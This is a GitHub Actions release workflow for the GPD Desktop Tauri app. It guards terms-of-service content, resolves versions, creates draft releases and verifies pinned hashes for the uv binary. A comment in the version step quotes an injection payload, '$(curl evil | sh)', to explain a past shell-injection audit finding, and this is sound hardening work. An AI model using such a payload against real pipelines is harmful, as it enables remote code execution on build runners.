name: GPD Desktop Release

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Override version (leave empty to auto-detect)"
        required: false
        type: string
      version_source:
        description: "Where to read version from (ignored if version is set)"
        required: false
        type: choice
        default: github
        options:
          - github
          - pypi
          - npm
      allow_placeholder_tos:
        description: "DEV ONLY bypass TOS placeholder guard. Paper trail only; every dispatch records actor."
        required: false
        type: boolean
        default: false

permissions:
  contents: write
  actions: read

jobs:
  tos-guard:
    name: Block placeholder TOS from shipping
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fail if TOS text or version is placeholder
        env:
          # User-controlled workflow inputs pass through $ENV rather
          # than ${{ ... }} interpolation to block shell injection via
          # crafted dispatch arguments. See resolve-version step
          # comments for the full rationale (H1 audit finding).
          INPUT_ALLOW_PLACEHOLDER: ${{ inputs.allow_placeholder_tos }}
          DISPATCH_ACTOR: ${{ github.actor }}
        run: |
          set -euo pipefail
          if [ "$INPUT_ALLOW_PLACEHOLDER" = "true" ]; then
            echo "::warning::TOS placeholder guard BYPASSED by $DISPATCH_ACTOR. For dev / internal distribution only. Do NOT ship this build to external users."
            exit 0
          fi
          TOS=packages/app/src/components/tos-content.tsx
          if ! test -f "$TOS"; then
            echo "::error::$TOS missing — cannot release without TOS content"
            exit 1
          fi
          # (a) version constant must not indicate a non-final draft
          VER=$(grep -oP 'CURRENT_TOS_VERSION = "\K[^"]+' "$TOS" || echo "")
          if [ -z "$VER" ]; then
            echo "::error::CURRENT_TOS_VERSION not found in $TOS"
            exit 1
          fi
          case "$VER" in
            *placeholder*|*PLACEHOLDER*|*draft*|*DRAFT*|*dev*|*DEV*|0.0*)
              echo "::error::CURRENT_TOS_VERSION='$VER' looks like a placeholder/draft. Bump to a legal-reviewed version string (e.g. 1.0) before releasing."
              exit 1
              ;;
          esac
          # (b) TOS_TEXT must not contain the sentinel
          if grep -qE "PLACEHOLDER|DO NOT SHIP" "$TOS"; then
            echo "::error::$TOS contains PLACEHOLDER / DO NOT SHIP sentinel. Replace with legal-reviewed TOS text before releasing."
            grep -nE "PLACEHOLDER|DO NOT SHIP" "$TOS" || true
            exit 1
          fi
          # (c) TOS_TEXT_SHA256 + PRIVACY_TEXT_SHA256 constants must match
          # their actual text hashes. These are the client-side commitments
          # POSTed with every acceptance; stale constants would corrupt
          # server-side audit records.
          #
          # Hash computation lives in scripts/check-tos-hashes.py — flush-left
          # heredocs inside YAML block scalars terminate the `run: |` block
          # early, which caused GitHub to report "Workflow does not have
          # 'workflow_dispatch' trigger" until the heredoc was removed.
          HASHES=$(python3 scripts/check-tos-hashes.py)
          SHIPPED_TOS_SHA=$(echo "$HASHES" | sed -n '1p')
          SHIPPED_PRIV_SHA=$(echo "$HASHES" | sed -n '2p')
          # Python for the extraction so the regex can span lines. GNU
          # grep -oP is line-oriented without -z, so the previous
          # `TOS_TEXT_SHA256 =\s*\n?\s*"..."` pattern never matched once
          # prettier wrapped the 64-char SHA onto its own source line.
          # That failure mode was masked locally by ugrep (which handles
          # cross-line -oP) and only surfaced on GNU grep in Actions,
          # where both captures came back empty and the guard fired
          # "constants missing/malformed".
          CONST_TOS_SHA=$(python3 -c 'import re,sys; m=re.search(r"TOS_TEXT_SHA256\s*=\s*\"([0-9a-f]{64})\"", open(sys.argv[1]).read()); print(m.group(1) if m else "")' packages/app/src/components/tos-content.tsx)
          CONST_PRIV_SHA=$(python3 -c 'import re,sys; m=re.search(r"PRIVACY_TEXT_SHA256\s*=\s*\"([0-9a-f]{64})\"", open(sys.argv[1]).read()); print(m.group(1) if m else "")' packages/app/src/components/tos-content.tsx)
          if [ -z "$CONST_TOS_SHA" ] || [ -z "$CONST_PRIV_SHA" ]; then
            echo "::error::TOS_TEXT_SHA256 and/or PRIVACY_TEXT_SHA256 constants missing/malformed in tos-content.tsx"
            exit 1
          fi
          if [ "$CONST_TOS_SHA" != "$SHIPPED_TOS_SHA" ]; then
            echo "::error::TOS_TEXT_SHA256 constant ($CONST_TOS_SHA) stale; actual text hashes to $SHIPPED_TOS_SHA. Update + commit."
            exit 1
          fi
          if [ "$CONST_PRIV_SHA" != "$SHIPPED_PRIV_SHA" ]; then
            echo "::error::PRIVACY_TEXT_SHA256 constant ($CONST_PRIV_SHA) stale; actual text hashes to $SHIPPED_PRIV_SHA. Update + commit."
            exit 1
          fi

          # (d) canonical legal texts must exist on disk with matching SHAs
          for pair in "TOS:$SHIPPED_TOS_SHA" "PRIVACY:$SHIPPED_PRIV_SHA"; do
            DOC="${pair%%:*}"
            WANT_SHA="${pair##*:}"
            LEGAL=infra/legal/${DOC}-v${VER}.md
            if ! test -f "$LEGAL"; then
              echo "::error::Missing canonical legal text at $LEGAL. Commit the legal-reviewed markdown so acceptance rows can be audited back to the exact terms."
              exit 1
            fi
            GOT_SHA=$(python3 -c "import hashlib,pathlib; print(hashlib.sha256(pathlib.Path('$LEGAL').read_text().encode('utf-8')).hexdigest())")
            if [ "$GOT_SHA" != "$WANT_SHA" ]; then
              echo "::error::${DOC} SHA256 ($WANT_SHA) does not match $LEGAL ($GOT_SHA). User-shipped and legal-reviewed docs have diverged."
              exit 1
            fi
          done
          echo "✓ TOS v$VER passes placeholder + text-hash guards"
          echo "    tos_text_sha256=$SHIPPED_TOS_SHA"
          echo "    privacy_text_sha256=$SHIPPED_PRIV_SHA"

  resolve-version:
    needs: tos-guard
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
      base_version: ${{ steps.version.outputs.base_version }}
      sidecar_version: ${{ steps.version.outputs.sidecar_version }}
      source: ${{ steps.version.outputs.source }}
    steps:
      - id: version
        env:
          GH_TOKEN: ${{ github.token }}
          # User-controlled workflow inputs are passed through env, not
          # interpolated into the shell body with ${{ ... }}. The old
          # code did `SOURCE="${{ inputs.version_source || 'github' }}"`
          # etc.; a dispatcher with `actions: write` could set
          # `inputs.version` to `$(curl evil | sh)` and that string
          # would reach `bash -e` verbatim. Reading through $ENV inside
          # the script is literal: the shell never re-evaluates
          # `$INPUT_VERSION`'s contents as code. (H1 audit finding.)
          INPUT_VERSION_SOURCE: ${{ inputs.version_source || 'github' }}
          INPUT_VERSION: ${{ inputs.version }}
          REPO_SLUG: ${{ github.repository }}
        run: |
          set -euo pipefail

          # Always resolve the sidecar (get-physics-done) version from the
          # requested source. This is reported in the release body regardless
          # of whether the desktop version is overridden.
          SOURCE="$INPUT_VERSION_SOURCE"
          echo "Resolving sidecar version from: $SOURCE"
          case "$SOURCE" in
            pypi)
              SIDECAR_VERSION=$(curl -s https://pypi.org/pypi/get-physics-done/json | python3 -c "import sys,json; print(json.load(sys.stdin)['info']['version'])")
              ;;
            github)
              SIDECAR_VERSION=$(gh api repos/psi-oss/get-physics-done/contents/pyproject.toml --jq '.content' | base64 -d | grep '^version' | head -1 | grep -oP '"\K[^"]+')
              ;;
            npm)
              SIDECAR_VERSION=$(curl -s https://registry.npmjs.org/get-physics-done | python3 -c "import sys,json; print(json.load(sys.stdin)['dist-tags']['latest'])")
              ;;
            *)
              echo "::error::unknown version_source: $SOURCE"
              exit 1
              ;;
          esac
          echo "Sidecar version (get-physics-done): $SIDECAR_VERSION"

          # Desktop version resolution:
          #
          # Default (no inputs.version): auto-compute the next patch-bumped
          # X.Y.Z from the repo's own release history. The sidecar version is
          # NOT the correct seed here — desktop releases (1.1.10 … 1.1.13)
          # have diverged from the sidecar's pinned pyproject.toml (still
          # 1.1.0), so following the sidecar would collide with the legacy
          # 1.1.0-N scheme and produce pre-release suffixes that the Tauri
          # auto-updater rejects for in-place upgrades.
          #
          # Algorithm: pick the highest existing X.Y.Z desktop tag in the
          # repo (draft OR published). If it's a draft, join it — this
          # preserves retry-friendliness (partial-upload re-dispatch lands
          # on the same draft). If it's published, bump the patch by one.
          # If there are no existing desktop releases at all, fall back to
          # the sidecar version as the seed.
          #
          # An explicit inputs.version override uses that value exactly
          # (with the collision loop below handling rare races where a
          # draft was published between resolve and build).
          REPO="$REPO_SLUG"
          if [ -n "$INPUT_VERSION" ]; then
            # Validate against a strict semver-ish pattern so a mistyped
            # or attacker-supplied override can't be anything other than
            # digits and dots. The downstream tag builder assumes a
            # clean numeric value.
            if ! printf '%s' "$INPUT_VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
              echo "::error::inputs.version must be X.Y.Z or X.Y.Z-tag (got: $INPUT_VERSION)"
              exit 1
            fi
            BASE_VERSION="$INPUT_VERSION"
            RESOLVE_SOURCE="manual"
            echo "Desktop version override: $BASE_VERSION"
          else
            HIGHEST=$(gh release list --repo "$REPO" --limit 100 --json tagName --jq '.[].tagName' \
              | grep -oE '^gpd-desktop-v[0-9]+\.[0-9]+\.[0-9]+$' \
              | sed 's/^gpd-desktop-v//' \
              | sort -V \
              | tail -1 || true)
            if [ -z "$HIGHEST" ]; then
              BASE_VERSION="$SIDECAR_VERSION"
              RESOLVE_SOURCE="auto-seed-sidecar"
              echo "No existing X.Y.Z desktop release; seeding from sidecar: $BASE_VERSION"
            else
              HIGHEST_IS_DRAFT=$(gh api "repos/$REPO/releases/tags/gpd-desktop-v$HIGHEST" --jq '.draft' 2>/dev/null || echo false)
              if [ "$HIGHEST_IS_DRAFT" = "true" ]; then
                BASE_VERSION="$HIGHEST"
                RESOLVE_SOURCE="auto-join-draft"
                echo "Highest desktop release $HIGHEST is a draft; joining it (retry-friendly)."
              else
                MAJOR=$(echo "$HIGHEST" | cut -d. -f1)
                MINOR=$(echo "$HIGHEST" | cut -d. -f2)
                PATCH=$(echo "$HIGHEST" | cut -d. -f3)
                BASE_VERSION="$MAJOR.$MINOR.$((PATCH+1))"
                RESOLVE_SOURCE="auto-bump-patch"
                echo "Highest desktop release $HIGHEST is published; bumping patch to $BASE_VERSION."
              fi
            fi
          fi

          # Collision loop (applies to both override and auto paths).
          # - Exact match + draft: join.
          # - Exact match + published: bump patch for semver bases; fall
          #   back to -N suffix for non-semver bases (pre-releases,
          #   release candidates, etc.) so an explicit `version=X.Y.Z-rc1`
          #   override still has an escape hatch.
          # - No tag: fresh draft.
          CANDIDATE="$BASE_VERSION"
          RESOLVED=""
          for N in {0..100}; do
            TAG="gpd-desktop-v$CANDIDATE"
            if RJ=$(gh api "repos/$REPO/releases/tags/$TAG" 2>/dev/null); then
              IS_DRAFT=$(printf '%s' "$RJ" | python3 -c "import sys,json; print(json.load(sys.stdin).get('draft', False))")
              if [ "$IS_DRAFT" = "True" ]; then
                echo "Draft release $TAG exists; will add assets to it."
                RESOLVED="$CANDIDATE"
                break
              fi
              echo "Tag $TAG is already published; trying next candidate."
              if echo "$CANDIDATE" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+$'; then
                C_MAJOR=$(echo "$CANDIDATE" | cut -d. -f1)
                C_MINOR=$(echo "$CANDIDATE" | cut -d. -f2)
                C_PATCH=$(echo "$CANDIDATE" | cut -d. -f3)
                CANDIDATE="$C_MAJOR.$C_MINOR.$((C_PATCH+1))"
              else
                CANDIDATE="$BASE_VERSION-$((N+1))"
              fi
            else
              echo "Tag $TAG does not exist; will create a fresh draft."
              RESOLVED="$CANDIDATE"
              break
            fi
          done

          if [ -z "$RESOLVED" ]; then
            echo "::error::Could not resolve a usable tag for $BASE_VERSION after 100 iterations. Pass an explicit version input."
            exit 1
          fi

          VERSION="$RESOLVED"
          echo "Resolved desktop release: $VERSION (tag: gpd-desktop-v$VERSION, base: $BASE_VERSION, sidecar: $SIDECAR_VERSION, source: $RESOLVE_SOURCE)"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "base_version=$BASE_VERSION" >> "$GITHUB_OUTPUT"
          echo "sidecar_version=$SIDECAR_VERSION" >> "$GITHUB_OUTPUT"
          echo "source=$RESOLVE_SOURCE" >> "$GITHUB_OUTPUT"

  build-cli:
    needs: resolve-version
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: "1.3.11"
      - run: bun install
      - name: Build CLI
        run: ./packages/opencode/script/build.ts
        env:
          OPENCODE_VERSION: ${{ needs.resolve-version.outputs.version }}
      - uses: actions/upload-artifact@v4
        with:
          name: opencode-cli
          path: packages/opencode/dist/opencode-*

  create-draft:
    # Pre-create the draft release ONCE so all build-desktop matrix jobs
    # upload to the same release ID. Without this, each matrix job calls
    # tauri-action's "find draft by tag, else create" and races: the
    # GitHub releases list endpoint has indexing lag (>30s observed) so
    # parallel jobs that finish their Tauri build within ~30s of each
    # other all see "no draft yet" and create separate drafts. This is
    # what produced 3-4 duplicate v1.1.15 / v1.1.16 drafts each owning
    # only one platform's assets. Historic releases avoided it by
    # accident: build-time variance from cold Cargo caches spread
    # uploads across ~20min, large enough for the API to index between
    # finishes. Cargo cache hits compressed that window and exposed
    # the race.
    #
    # The job is idempotent: a re-dispatched workflow finds the existing
    # draft for this tag and re-uses its ID (matches resolve-version's
    # auto-join-draft path).
    needs: [tos-guard, resolve-version]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    outputs:
      release_id: ${{ steps.create.outputs.release_id }}
    steps:
      - id: create
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          TAG: gpd-desktop-v${{ needs.resolve-version.outputs.version }}
          NAME: GPD v${{ needs.resolve-version.outputs.version }}
          VERSION: ${{ needs.resolve-version.outputs.version }}
          SIDECAR_VERSION: ${{ needs.resolve-version.outputs.sidecar_version }}
          COMMITISH: ${{ github.sha }}
        run: |
          set -euo pipefail
          # Reuse if a draft for this tag already exists (resolve-version
          # may have selected auto-join-draft, OR a prior dispatch was
          # cancelled mid-run leaving a draft behind).
          EXISTING_ID=$(gh api graphql -f query='
            query($owner:String!,$repo:String!) {
              repository(owner:$owner, name:$repo) {
                releases(first:50, orderBy:{field:CREATED_AT, direction:DESC}) {
                  nodes { databaseId tagName isDraft }
                }
              }
            }' -F owner="${REPO%/*}" -F repo="${REPO#*/}" \
            --jq ".data.repository.releases.nodes[] | select(.tagName == \"$TAG\" and .isDraft) | .databaseId" \
            | head -1)
          if [ -n "$EXISTING_ID" ]; then
            echo "Reusing existing draft id=$EXISTING_ID for tag $TAG"
            echo "release_id=$EXISTING_ID" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          # Create a fresh draft. Use REST to get the JSON response with
          # the ID directly; gh release create only emits the URL.
          BODY=$(printf 'GPD Desktop App v%s — Physics Research Workspace by PSI\n\n**Bundled sidecar:** get-physics-done v%s' "$VERSION" "$SIDECAR_VERSION")
          NEW_ID=$(gh api -X POST "repos/$REPO/releases" \
            -f tag_name="$TAG" \
            -f target_commitish="$COMMITISH" \
            -f name="$NAME" \
            -f body="$BODY" \
            -F draft=true \
            -F prerelease=false \
            --jq '.id')
          if [ -z "$NEW_ID" ] || [ "$NEW_ID" = "null" ]; then
            echo "::error::Failed to create draft release for $TAG"
            exit 1
          fi
          echo "Created draft id=$NEW_ID for tag $TAG"
          echo "release_id=$NEW_ID" >> "$GITHUB_OUTPUT"

  build-desktop:
    needs: [resolve-version, build-cli, create-draft]
    strategy:
      fail-fast: false
      matrix:
        include:
          - host: macos-latest
            target: aarch64-apple-darwin
            label: mac-arm
          - host: macos-latest
            target: x86_64-apple-darwin
            label: mac-intel
          - host: windows-latest
            target: x86_64-pc-windows-msvc
            label: windows
          - host: ubuntu-latest
            target: x86_64-unknown-linux-gnu
            label: linux
    runs-on: ${{ matrix.host }}
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: "1.3.11"

      - uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Install Linux deps
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf

      - uses: dtolnay/rust-toolchain@stable
        with:
          targets: ${{ matrix.target }}

      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: packages/desktop/src-tauri
          shared-key: ${{ matrix.target }}

      - name: Install dependencies
        run: bun install

      - name: Prepare sidecars
        working-directory: packages/desktop
        run: bun ./scripts/prepare.ts
        env:
          OPENCODE_VERSION: ${{ needs.resolve-version.outputs.version }}
          RUST_TARGET: ${{ matrix.target }}
          GH_TOKEN: ${{ github.token }}
          GITHUB_RUN_ID: ${{ github.run_id }}
          OPENCODE_CLI_ARTIFACT: opencode-cli

      - name: Download uv binary
        shell: bash
        env:
          # Expected SHA256 sums per (UV_VERSION, platform) pinned in
          # this workflow. If you bump UV_VERSION, regenerate by
          # fetching each platform's .sha256 file from the astral-sh/uv
          # release and pasting the hex digest below. Hardcoded (not
          # fetched-at-build-time) so a compromise of astral-sh's
          # GitHub or its CDN at the moment of CI can't silently
          # substitute a backdoored `uv` — a tamper would make CI fail
          # instead of shipping. Previously: `curl | tar xz` with no
          # integrity check at all (H2 audit finding).
          UV_SHA_AARCH64_APPLE_DARWIN: 162b328fc63e0075d4267688201de91356e1c1b81db50419fa4466cfe2dfdebc
          UV_SHA_X86_64_APPLE_DARWIN: d676940b51bdd5606b218bc2965fed67731f94ad07926045716acbf78626e09b
          UV_SHA_X86_64_PC_WINDOWS_MSVC: 20d3a420abbf2af9699cd9a02225d9325344046af8deb15563cc451e3c4fd059
          UV_SHA_X86_64_UNKNOWN_LINUX_GNU: 17fc118ba4d7e9303f84fcabdc0a593fc3480ba76eb6980668fdbbb96fe88562
          MATRIX_TARGET: ${{ matrix.target }}
          RUNNER_OS: ${{ runner.os }}
        run: |
          set -euo pipefail
          UV_VERSION="0.7.3"
          case "$MATRIX_TARGET" in
            aarch64-apple-darwin)      UV_PLATFORM="aarch64-apple-darwin"     ; EXPECTED_SHA="$UV_SHA_AARCH64_APPLE_DARWIN" ;;
            x86_64-apple-darwin)       UV_PLATFORM="x86_64-apple-darwin"      ; EXPECTED_SHA="$UV_SHA_X86_64_APPLE_DARWIN" ;;
            x86_64-pc-windows-msvc)    UV_PLATFORM="x86_64-pc-windows-msvc"   ; EXPECTED_SHA="$UV_SHA_X86_64_PC_WINDOWS_MSVC" ;;
            x86_64-unknown-linux-gnu)  UV_PLATFORM="x86_64-unknown-linux-gnu" ; EXPECTED_SHA="$UV_SHA_X86_64_UNKNOWN_LINUX_GNU" ;;
            *) echo "::error::unknown uv target: $MATRIX_TARGET"; exit 1 ;;
          esac
          mkdir -p packages/desktop/src-tauri/uv-bundle
          if [ "$RUNNER_OS" = "Windows" ]; then
            ARCHIVE=/tmp/uv.zip
            URL="https://github.com/astral-sh/uv/releases/download/${UV_VERSION}/uv-${UV_PLATFORM}.zip"
          else
            ARCHIVE=/tmp/uv.tar.gz
            URL="https://github.com/astral-sh/uv/releases/download/${UV_VERSION}/uv-${UV_PLATFORM}.tar.gz"
          fi
          curl -fsSL "$URL" -o "$ARCHIVE"
          # Verify BEFORE extract so a bad archive never touches the
          # build tree. openssl is the only sha256 tool present on all
          # three GH-hosted runners — macOS-latest has /usr/bin/openssl,
          # ubuntu-latest has openssl, and windows-latest's Git-Bash
          # bundles it (where shasum / sha256sum are NOT present, which
          # broke the v1.1.15 release with `shasum: command not found`).
          # Output shape: "SHA256(file)= abc..."; last field is the hash.
          ACTUAL_SHA=$(openssl dgst -sha256 "$ARCHIVE" | awk '{print $NF}')
          if [ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]; then
            echo "::error::uv binary hash mismatch for $UV_PLATFORM"
            echo "::error::expected: $EXPECTED_SHA"
            echo "::error::actual:   $ACTUAL_SHA"
            echo "::error::refusing to ship a tampered or unpinned uv binary"
            exit 1
          fi
          echo "uv sha256 ok ($ACTUAL_SHA)"
          if [ "$RUNNER_OS" = "Windows" ]; then
            unzip "$ARCHIVE" -d packages/desktop/src-tauri/uv-bundle
          else
            tar xz -C packages/desktop/src-tauri/uv-bundle --strip-components=1 < "$ARCHIVE"
          fi
          rm -f "$ARCHIVE"
          chmod +x packages/desktop/src-tauri/uv-bundle/uv 2>/dev/null || true
          echo "uv binary staged: $(du -sh packages/desktop/src-tauri/uv-bundle | cut -f1)"

      # Linux AppImage workaround (same as upstream publish.yml)
      - name: Resolve tauri portable SHA
        if: runner.os == 'Linux'
        run: echo "TAURI_PORTABLE_SHA=$(git ls-remote https://github.com/tauri-apps/tauri.git refs/heads/feat/truly-portable-appimage | cut -f1)" >> "$GITHUB_ENV"

      - name: Install tauri-cli from portable appimage branch
        uses: taiki-e/cache-cargo-install-action@v3
        if: runner.os == 'Linux'
        with:
          tool: tauri-cli
          git: https://github.com/tauri-apps/tauri
          rev: ${{ env.TAURI_PORTABLE_SHA }}

      - name: Build Tauri app
        uses: tauri-apps/tauri-action@v0
        with:
          projectPath: packages/desktop
          tauriScript: ${{ (runner.os == 'Linux' && 'cargo tauri') || '' }}
          args: --target ${{ matrix.target }} --config ./src-tauri/tauri.prod.conf.json
          # releaseId is set by the upstream create-draft job so all
          # parallel matrix entries upload to the same draft. tagName /
          # releaseName / releaseBody / releaseDraft / prerelease are
          # ignored when releaseId is provided. See create-draft job
          # comment for the parallel-create race this prevents.
          releaseId: ${{ needs.create-draft.outputs.release_id }}
          updaterJsonPreferNsis: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAURI_BUNDLER_NEW_APPIMAGE_FORMAT: true
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
